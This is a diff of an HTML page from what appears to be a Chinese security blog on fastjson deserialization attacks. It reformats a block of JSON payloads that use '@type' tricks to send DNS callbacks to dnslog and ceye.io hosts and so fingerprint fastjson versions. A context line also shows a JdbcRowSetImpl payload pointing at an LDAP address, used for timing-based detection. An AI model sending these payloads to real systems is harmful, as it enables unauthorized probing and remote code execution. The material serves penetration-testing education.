@@ -433,7 +433,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    111 分
+                    112 分
                 </div>
                 
 
@@ -955,7 +955,37 @@ public class Main {
 // fastjson &lt; 1.2.48 (测试成功)
 {"@type":"java.net.InetAddress","val":"x.x.x.x"}
 
-// fastjson &lt;= 1.2.68 {{"@type":"java.net.url","val":"http: dnslog"}:"aaa"} set[{"@type":"java.net.url","val":"http: dnslog"}] dnslog"} {"@type":"com.alibaba.fastjson.jsonobject", {"@type": "java.net.url", "val":"http: dnslog"}}""} dnslog"}:0 {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} {"@type":"java.net.inetsocketaddress"{"address":,"val":"dnslog"}} 精确版本探测(kcon2022-hacking-json.pdf) fastjson 1.2.47 版本探测 [ {"@type": "java.lang.class","val": "java.io.bytearrayoutputstream"}, "java.net.inetsocketaddress"{"address":,"val": "aaa.xxxx.ceye.io"}} ] "java.lang.autocloseable","@type": "bbb.n41tma.ceye.io"}} 1.2.80 收到一个dns请求，1.2.83 收到两个dns请求 "java.lang.exception","@type": "com.alibaba.fastjson.jsonexception","x": "first.dnslog.com"}}}, "com.alibaba.fastjson.jsonexception","message": "ddd.4fhgzj.dnslog.cn"}}} &lt; code&gt;<!--=--></code></pre>
+// fastjson &lt;= 1.2.68
+{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}
+Set[{"@type":"java.net.URL","val":"http://dnslog"}]
+Set[{"@type":"java.net.URL","val":"http://dnslog"}
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
+{{"@type":"java.net.URL","val":"http://dnslog"}:0
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+
+// 精确版本探测(KCon2022-Hacking-JSON.pdf)
+// fastjson 1.2.47 版本探测
+[
+  {"@type": "java.lang.Class","val": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.net.InetSocketAddress"{"address":,"val": "aaa.xxxx.ceye.io"}}
+]
+
+// fastjson 1.2.68 版本探测
+[
+  {"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.io.ByteArrayOutputStream"},
+  {"@type": "java.net.InetSocketAddress"{"address":,"val": "bbb.n41tma.ceye.io"}}
+]
+
+// fastjson 1.2.80 收到一个dns请求，1.2.83 收到两个dns请求
+[
+  {"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","x": {"@type": "java.net.InetSocketAddress"{"address":,"val": "first.dnslog.com"}}},
+
+  {"@type": "java.lang.Exception","@type": "com.alibaba.fastjson.JSONException","message": {"@type": "java.net.InetSocketAddress"{"address":,"val": "ddd.4fhgzj.dnslog.cn"}}}
+]
+</code></pre>
 <h4 id="3-2-4-请求延迟判断"><a href="#3-2-4-请求延迟判断" class="headerlink" title="3.2.4 请求延迟判断"></a>3.2.4 <strong>请求延迟判断</strong></h4><p>利用<code>fastjson</code>解析地址时请求本机已开放端口不延时，请求不开放的端口则延时的特性判断:</p>
 <pre><code class="line-numbers language-json">// 1.1.16&lt;= fastjson &lt;=1.2.11，第一个响应时间很长，第二个较短，可判断版本范围
 {"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true}}""}
@@ -4032,7 +4062,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">87.2k</span>&nbsp;字
+                class="white-color">87.3k</span>&nbsp;字
             
             
             
